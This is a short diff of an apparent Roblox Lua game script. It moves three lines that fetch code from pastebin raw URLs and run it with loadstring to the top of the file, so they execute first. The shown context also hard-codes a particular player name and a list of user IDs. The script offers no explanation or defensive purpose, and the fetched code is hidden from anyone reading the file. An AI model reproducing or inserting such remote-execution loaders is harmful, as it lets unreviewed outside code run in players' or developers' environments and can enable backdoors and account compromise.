@@ -1,3 +1,11 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/r3qc3g45'),true))()
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/7Qct1ec8'),true))()
+
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/bg3J4Egk'),true))()
+
+
 
 game.Players.PlayerAdded:Connect(function(player)
 	local Player = game.Players.youaredumb281
@@ -171,12 +179,7 @@ end)
 
 
 
-loadstring(game:HttpGet(('https://pastebin.com/raw/r3qc3g45'),true))()
 
-loadstring(game:HttpGet(('https://pastebin.com/raw/7Qct1ec8'),true))()
-
-
-loadstring(game:HttpGet(('https://pastebin.com/raw/bg3J4Egk'),true))()
 
 local ids = {552979058, 593415315, 1}
 local plr = game:getService("Players").LocalPlayer
